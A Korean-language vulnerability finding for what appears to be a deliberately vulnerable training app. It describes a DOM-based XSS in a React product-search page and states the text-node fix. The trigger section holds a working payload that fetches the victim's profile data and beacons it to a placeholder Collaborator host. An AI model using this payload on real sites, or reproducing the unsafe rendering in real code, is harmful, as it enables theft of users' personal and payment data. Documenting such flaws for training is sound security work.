# VULN-017 상품 검색 결과 헤딩 DOM 기반 XSS

- 대상 스택: client (node-express / java-spring 양쪽 백엔드에서 공통)
- 심각도: Medium
- 분류: A03:2021 Injection (DOM-based XSS, CWE-79)

## 위치

`apps/client/src/pages/Products.jsx` — URL 쿼리 파라미터 `q`(`useSearchParams().get('q')`)를 `dangerouslySetInnerHTML={{ __html: `'${q}' 검색 결과` }}` 로 렌더링. 서버 왕복 없이 클라이언트에서 직접 sink 로 흘러감.

## 트리거 방법

```
http://localhost:8090/products?q=<img src=x onerror="fetch('/api/node/profile').then(r=>r.json()).then(d=>navigator.sendBeacon('https://<collab>/',JSON.stringify(d)))">
```

`q` 값은 API(`GET /api/products?q=...`)로도 전달되지만 페이로드 실행은 전적으로 브라우저 DOM 에서 일어난다(서버 로그의 `q` 는 검색어로만 기록).

## 영향

- 링크를 클릭한 로그인 사용자의 세션으로 임의 API 호출 → 세션 PII, 주문 `tossPaymentKey`, localStorage 장바구니 유출.
- VULN-008(저장형, DB 소스)과 구분: 소스가 URL, 클래스가 DOM 기반.

## 증거 (재현 확인)

(진단 단계에서 채움) 위 URL 접근 시 서버 접근 로그에는 XSS 페이로드가 검색어 파라미터로만 남고, Collaborator 로 브라우저에서 수집한 프로필 JSON 이 도착 → 클라이언트 측 sink 임을 입증.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현은 검색어를 텍스트 노드로만 렌더링(`{`'${q}' 검색 결과`}`) — `dangerouslySetInnerHTML` 제거.
